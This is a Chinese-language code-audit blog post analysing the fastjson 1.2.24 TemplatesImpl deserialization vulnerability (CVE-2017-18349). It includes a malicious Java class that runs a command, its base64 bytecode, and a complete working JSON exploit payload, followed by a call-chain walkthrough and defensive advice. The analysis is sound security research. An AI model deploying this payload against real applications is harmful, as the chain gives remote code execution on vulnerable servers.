---
title: fastjson1.2.24 TemplatesImpl EXP analysis
date: 2023-07-06 17:58:30
tags:
top: 50
categories:
- code-audit
---

First published: [比瓴科技 攻防演练期间高风险组件漏洞分析系列：fastjson1.2.24 TemplatesImpl 利用链分析](https://mp.weixin.qq.com/s/8recPwGFPwCcB7x0ANOfwA)

- [1 导语](#1-导语)
- [2 实验环境](#2-实验环境)
- [3 POC复现过程](#3-poc复现过程)
    - [3.1引入依赖](#31引入依赖)
    - [3.2构造恶意类](#32构造恶意类)
    - [3.3将恶意类编译字节码](#33将恶意类编译字节码)
    - [3.4 base64编码EvilClass.class](#34-base64编码evilclassclass)
    - [3.5 POC](#35-poc)
- [4 正向分析](#4-正向分析)
    - [4.1 分析TemplatesImpl](#41-分析templatesimpl)
        - [1、ClassLoader:类加载器](#1classloader类加载器)
        - [2、 重写ClassLoader，读取字节码，加载类](#2-重写classloader读取字节码加载类)
        - [3、TemplatesImpl重写defineClass方法](#3templatesimpl重写defineclass方法)
        - [4、调用链发现](#4调用链发现)
        - [5、找newTransformer()的正确调用路径，过滤结果](#5找newtransformer的正确调用路径过滤结果)
    - [4.2 fastjson为什么需要使用@type键触发](#42-fastjson为什么需要使用type键触发)
    - [4.3 分析：如何构造payload](#43-分析如何构造payload)
    - [4.4 漏洞风险](#44-漏洞风险)
- [5 对开发安全的启示](#5-对开发安全的启示)


# 1 导语

fastjson是HVV行动中几乎最为常见的风险组件，在maven库中收录的直接关联CVE编号有两个：CVE-2017-18349和CVE-2022-25845；未被CVE收录的特定触发情景的payload也有多个。最近在优化我司组件可达性检测引擎时，复盘fastjson多个版本的挖掘和绕过思路，受益匪浅。

从开发角度看，fastjson是阿里团队从底层构建的解决JSON功能的组件，代码开源、使用简单，对大型json数据支持速度快，并支持额外场景下的序列化能力。因此，fastjson组件被广泛引用。

从漏洞分析角度看，fastjson组件本身并非单纯的RCE漏洞，须具备特定情境才可触发；fastjson调用链长，需逐步调试去理解调用关系；对java runtime的类加载器ClassLoader需理解原理；官方修复思路和漏洞挖掘者的绕过思路持续了整整1.2.2x到1.2.8x多个版本，思路清晰巧妙，是经典的代码审计素材。

本文以CVE-2017-18349的TemplatesImpl调用链分析，该漏洞触发有三条链，本文仅分析 getOutputProperties()调用链。本文会更多的从原理和正向挖掘的角度，展示对漏洞的审计思路。

# 2 实验环境

    JDK版本：jdk1.8u144
    fastjson 1.2.24:
    git: https://github.com/alibaba/fastjson commit id: fbba126
    （注：此漏洞需fastjson版本1.2.22(含)到1.2.24(含)，1.2.21和1.2.23无法触发）

# 3 POC复现过程

### 3.1引入依赖

pom.xml中引入fastjson 1.2.24的依赖。

    <dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.24</version>
    </dependency>


### 3.2构造恶意类

代码如下，构造EvilClass，并创建构造函数，命令执行calc.exe弹出一个计算机程序。

    package org.example;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class EvilClass extends AbstractTranslet {public EvilClass() throws IOException {        Runtime.getRuntime().exec("calc.exe");    }@Overridepublic void transform(DOM document, SerializationHandler[] handlers) throws TransletException{    }public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{    }}


### 3.3将恶意类编译字节码

切入EvilClass.java所在目录，执行命令：

    "C:\Program Files\Java\jdk1.8.0_102\bin\javac.exe"   EvilClass.java

如图所示：

![2024-04-14-12-32-18](2024-04-14-12-32-18.png)


### 3.4 base64编码EvilClass.class

使用如下程序输出字节码的编码内容：

    package org.example;import java.io.ByteArrayOutputStream;import java.io.FileInputStream;import java.util.Base64;public class printEncodeClassByteCode {public static void main(String args[]) {byte[] buffer = null;        String filepath = "C:\\Users\\ranja\\Desktop\\工作任务\\javaComponentTestDemo\\src\\main\\java\\org\\example\\EvilClass.class";try {            FileInputStream fis = new FileInputStream(filepath);            ByteArrayOutputStream bos = new ByteArrayOutputStream();byte[] b = new byte[1024];int n;while((n = fis.read(b))!=-1) {                bos.write(b,0,n);            }            fis.close();            bos.close();            buffer = bos.toByteArray();        }catch(Exception e) {            e.printStackTrace();        }        Base64.Encoder encoder = Base64.getEncoder();        String value = encoder.encodeToString(buffer);        System.out.println(value);    }}

输出：

    yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA5FdmlsQ2xhc3MuamF2YQwABwAIBwAcDAAdAB4BAAhjYWxjLmV4ZQwAHwAgAQAVb3JnL2V4YW1wbGUvRXZpbENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEgALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==

### 3.5 POC

    package org.example;

    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.Feature;
    public class POC1 {
    public static void main(String[] args) {
    String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\":[\"yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA5FdmlsQ2xhc3MuamF2YQwABwAIBwAcDAAdAB4BAAhjYWxjLmV4ZQwAHwAgAQAVb3JnL2V4YW1wbGUvRXZpbENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEgALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==\"], \"_name\":\"\", \"_tfactory\":{ },\"_outputProperties\":{}}";

    JSON.parseObject(payload, Feature.SupportNonPublicField);
        }
    }

运行，弹出计算器，如图：

![2024-04-14-12-35-01](2024-04-14-12-35-01.png)


# 4 正向分析

### 4.1 分析TemplatesImpl

##### 1、ClassLoader:类加载器

解释TemplatesImpl漏洞调用链，首先需要简单说明ClassLoader的运行机制。因为造成漏洞的根本原因，是由于TemplatesImpl继承ClassLoader并重写了defineClass方法拥有了类加载器的能力。

java的类加载器是ClassLoader，主要用于加载.class字节码文件的类到内存。其使用的主要成员方法是findLoadedClass()、loadClass()、findClass()、defineClass()，使用伪代码表示大概关系：

    public abstract class ClassLoader {
    public Class<?> loadClass(String name){
    // 查找这个类是否已经加载了
            Class<?> cls = findLoadedClass(name);
    if (cls == null) {
    // 使用父加载器尝试加载类
                cls = parent.loadClass(name);
    // 父加载器加载失败，说明是外部自定义类，调用findClass加载字节码的类
    if (cls == null) {
                    cls = findClass(name);
                }
            }
    return cls;
        }

    protected Class<?> findClass(String name){
            Class cls = null; 
    // 读取命名空间的class字节码
            String classPath = dirPath + "/" + name.replace('.', '/') + ".class";
            byte[] data = getClassFileBytes(classPath);
    // 使用defineClass方法加载字节码，返回类
            cls = defineClass(name, data, 0, data.length);
    return cls;
        }
    }

##### 2、 重写ClassLoader，读取字节码，加载类

我在外部文件重写了ClassLoader去加载、运行上文payload的EvilClass.class字节码，弹出计算器，代码如下：

    CustomClassLoader.java


    package org.example;

    import java.io.ByteArrayOutputStream;
    import java.io.FileInputStream;
    import java.io.IOException;
    import java.nio.ByteBuffer;
    import java.nio.channels.Channels;
    import java.nio.channels.FileChannel;
    import java.nio.channels.WritableByteChannel;

    public class CustomClassLoader extends ClassLoader {
    private String dirPath;

    public CustomClassLoader(String dirPath) {
    this.dirPath = dirPath;
        }

    public CustomClassLoader(ClassLoader parent, String dirPath) {
    super(parent);
    this.dirPath = dirPath;
        }

    @Override
    public Class<?> loadClass(String name) throws ClassNotFoundException {
    // 查找这个类是否加载了
            Class<?> cls = findLoadedClass(name);
    if (cls == null) {
    // 获取到父加载器
                ClassLoader parent = this.getParent();
    try {
    // 委派给父加载器加载
                    cls = parent.loadClass(name);
                } catch (ClassNotFoundException e) {
    //                ignore
                }

    if (cls == null) {
                    cls = findClass(name);
                }
            }
    return cls;
        }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
            Class cls = null;
    try {
                String classPath = dirPath + "/" + name.replace('.', '/') + ".class";
    byte[] data = getClassFileBytes(classPath);
    if (data == null) {
    throw new ClassNotFoundException();
                }
                cls = defineClass(name, data, 0, data.length);
    if (cls == null) {
    throw new ClassFormatError();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
    return cls;
        }

    private byte[] getClassFileBytes(String classFile) throws IOException, IOException {
            FileInputStream fis = new FileInputStream(classFile);
            FileChannel fileChannel = fis.getChannel();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            WritableByteChannel outC = Channels.newChannel(baos);
            ByteBuffer buffer = ByteBuffer.allocateDirect(1024);
    while (true) {
    int i = fileChannel.read(buffer);
    if (i == 0 || i == -1) {
    break;
                }
                buffer.flip();
                outC.write(buffer);
                buffer.clear();
            }
            fis.close();
    return baos.toByteArray();
        }

    public static void main(String[] args){
            String dirPath = "C:\\Users\\ranja\\Desktop\\工作任务\\javaComponentTestDemo\\src\\main\\java"; // 替换为你的目录路径
            String className = "org.example.EvilClass"; // 替换为你的类名

            CustomClassLoader customClassLoader = new CustomClassLoader(dirPath);
    try {
                Class<?> cls = customClassLoader.loadClass(className);
    // 使用加载的类进行操作
                Object obj = cls.getDeclaredConstructor().newInstance(); // 实例化类对象
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

运行后弹出计算器，如图所示：

![2024-04-14-12-36-31](2024-04-14-12-36-31.png)


##### 3、TemplatesImpl重写defineClass方法

在com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java重写了ClassLoader，如下：


    static final class TransletClassLoader extends ClassLoader {
    private final Map<String,Class> _loadedExternalExtensionFunctions;

        TransletClassLoader(ClassLoader parent) {
    super(parent);
            _loadedExternalExtensionFunctions = null;
        }

        TransletClassLoader(ClassLoader parent,Map<String, Class> mapEF) {
    super(parent);
            _loadedExternalExtensionFunctions = mapEF;
        }

    public Class<?> loadClass(String name) throws ClassNotFoundException {
            Class<?> ret = null;
    // The _loadedExternalExtensionFunctions will be empty when the
    // SecurityManager is not set and the FSP is turned off
    if (_loadedExternalExtensionFunctions != null) {
                ret = _loadedExternalExtensionFunctions.get(name);
            }
    if (ret == null) {
                ret = super.loadClass(name);
            }
    return ret;
        }

    /**
        * Access to final protected superclass member from outer class.
        */
    Class defineClass(final byte[] b) {
    return defineClass(null, b, 0, b.length);
        }
    }


对用于加载字节码功能的defineClass方法的重写未标明访问修饰符，使得该方法的访问权限是default，可以被同包的其他类访问，这是调用链最底层的开始。

回到com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java第455行，看defineClass之外，代码对类反序列化的处理，如图所示：

![2024-04-14-12-37-19](2024-04-14-12-37-19.png)

可以看到限制了反序列化的类型为AbstractTranslet，跟进该类型，如下：

    public abstract class AbstractTranslet implements Translet

可知反序列化限制类型为AbstractTranslet的子类。

##### 4、调用链发现

对defineClass按下Alt+F7（查找用法），找到defineTransletClasses()，如图所示：

![2024-04-14-12-37-45](2024-04-14-12-37-45.png)

对defineTransletClasses()继续跟进“查找用法”，发现三处调用：


    public synchronized int getTransletIndex()
    private synchronized Class[] getTransletClasses()
    private Translet getTransletInstance()

如图所示：

![2024-04-14-12-38-25](2024-04-14-12-38-25.png)

本文仅分析其中的private Translet getTransletInstance()这条链。在getTransletInstance()要调用到defineTransletClasses()，需要满足_name不为null且_class是null的条件。如图：

![2024-04-14-13-13-30](2024-04-14-13-13-30.png)

对getTransletInstance()查找用法，跟进到public synchronized Transformer newTransformer()，如图：

![2024-04-14-13-14-06](2024-04-14-13-14-06.png)

对newTransformer()查找用法，会发现多个调用结果，如图所示：

![2024-04-14-13-14-32](2024-04-14-13-14-32.png)

##### 5、找newTransformer()的正确调用路径，过滤结果

newTransformer()是接口类型的实现，但是IDEA把其他的同名接口的“实现被调用”也当作“用法查找”的结果了。需要逐个跟进验证，确认这6个路径是否触发newTransformer()。

newTransformer()接口定义在javax/xml/transform/Templates.java，部分代码如下：


    public interface Templates {
    Transformer newTransformer() throws TransformerConfigurationException;

接下来的过滤方法，就是依次看IDEA返回的结果，看那处的Templates的实现和newTransformer()的实现是不是调用getTransletInstance()，作为过滤的标准。

比如，对第一个结果进行分析，如图：

![2024-04-14-13-15-26](2024-04-14-13-15-26.png)

看到stylesheet（即interface Templates）是tfactory.newTemplates(source)来实现，跟进newTemplates(source)部分，发现仅返回一个抽象类型的接口类型（Templates上文已提到是一个接口），如下：

    public abstract Templates newTemplates(Source source)
    throws TransformerConfigurationException;

那继续跟进tfactory类型，看其对newTemplates接口的实现部分的代码。跟进后未发现其重写newTemplates()，说明该条作为“触发newTransformer()”的“查找用法”的结果，不是我们期望的。

使用根据上下文接口实现的方法，可以依次排除另外4个于我们而言的非期望结果（均未执行到我们期望的Transformer()接口的代码），最终我们跟进getOutputProperties()，如图：

![2024-04-14-13-15-53](2024-04-14-13-15-53.png)

经过简单的步入调试，确认getOutputProperties()会执行到期望的Transformer()接口实现。结合fastjson的反序列化特性，getOutputProperties()将会成为POC入口。

### 4.2 fastjson为什么需要使用@type键触发

把fastjson代码clone下来，版本回退后，新建了Baduser类和Main类，用作调用fastjson的程序入口。

![2024-04-14-13-16-31](2024-04-14-13-16-31.png)

步入代码跟进，com/alibaba/fastjson/parser/DefaultJSONParser.java的325行，代码如下：

    if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) { String typeName = lexer.scanSymbol(symbolTable, '"');    Class<?> clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());

这里可以看到JSON.DEFAULT_TYPE_KEY，其在com/alibaba/fastjson/JSON.java进行了定义：


    public abstract class JSON implements JSONStreamAware, JSONAware {
        …
    public static String           DEFAULT_TYPE_KEY     = "@type";

再看上一段代码中满足key==”@type”的if逻辑，会触发如下代码：

    Class<?> clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());

此处的loadClass类似上文提到的类加载器，此处fastjson亦有不同程度的继承和改写。使用@type键，可以自行指定类名。

### 4.3 分析：如何构造payload

根据上文提及条件，漏洞构造初步条件如下：

    1.fastjson通过@type指定反序列类名，通过JSON.parse和JSON.parseObject两个路径可以触发无参构造函数、私有变量的set、get方法；
    2.对于TemplatesImpl类，分析获取的调用链顶点是getOutputProperties()，TemplatesImpl类有私有变量private Properties _outputProperties;
    3.第1和第2已满足payload运行入口，需要传入_outputProperties用以触发getOutputProperties()；
    4.根据对TemplatesImpl#getTransletInstance()的分析，构造的字节码的类必须是AbstractTranslet的子类，且需要满足_name不为null，且_class为null；

遂令_name为非null（空字符串或什么字符串均可），令outputProperties为{}（{}表示JSON的空对象，而非null，反序列化的实例对象的该成员变量为“空对象”而非null；若不写某些私有变量，则该值将为null），令_bytecodes为byte[][]类型。

由于涉及私有变量的反序列化，在进行反序列化时，需要携带支持私有变量的参数Feature.SupportNonPublicField，如：

    JSON.parseObject(payload, Feature.SupportNonPublicField);

初步构造payload如下：


    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\":[\"<EvilClass.class的base64编码>\"], \"_name\":\"\",\"_outputProperties\":{}}";
        JSON.parseObject(payload, Feature.SupportNonPublicField);
    }

运行完毕后，没有弹出计算器，只有报错，如图所示：

![2024-04-14-13-19-03](2024-04-14-13-19-03.png)

看到报错是set property error, outputProperties，目测是outputProperties属性赋值过程出现错误，跟进调试发现问题，如图所示：

![2024-04-14-13-19-33](2024-04-14-13-19-33.png)

由于没有给_tfactory赋值，此时_tfactory是null，代码_tfactory.getExternalExtensionsMap()报错。

跟进_tfactory，如下：

    private transient TransformerFactoryImpl _tfactory = null;

transient修饰符是说该成员值不受序列化和反序列化的影响，为默认值。但是transient修饰符仅对java自身的序列化反序列化机制有效，对fastjson的机制无效。此处transient表示了_tfactory仅需代码定义的默认值即可，修改此值对程序运行没有直接影响。

跟进TransformerFactoryImpl类型，确认成员方法中存在getExternalExtensionsMap()。

因此，我们在payload中对_tfactory变量传入{}即可使payload的执行正常。

payload修改如下：

    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\":[\"<EvilClass.class的base64编码>\"], \"_name\":\"\", \"_tfactory\":{},\"_outputProperties\":{}}";
        JSON.parseObject(payload, Feature.SupportNonPublicField);
    }

运行，成功执行POC。

![2024-04-14-13-20-35](2024-04-14-13-20-35.png)

### 4.4 漏洞风险

改漏洞在fastjson版本在[1.2.22, 1.2.24]中存在，如果代码中设置对SupportNonPublicField反序列化私有变量的支持，且存在fastjson.JSON.parse()或fastjson.JSON.parseObject()直接接受外部json数据的情景，该接口存在风险。

# 5 对开发安全的启示

本次漏洞的根本原因是由于TemplatesImpl类中重写了classLoader类，但没有写访问修饰符限制，导致重写后的defineClass方法默认是default属性，可以被同包其他类、方法访问，产生了调用链。

*对开发安全的启示：*

    1.重写classLoader类常见于反序列化功能的实现，反序列化伴随着安全隐患，需要慎重对待。建议使用严格的访问修饰符限制重写，减小被非预期调用的暴露面；
    2.fastjson的1版本官方已不再进行支持，建议使用fastjson2组件；















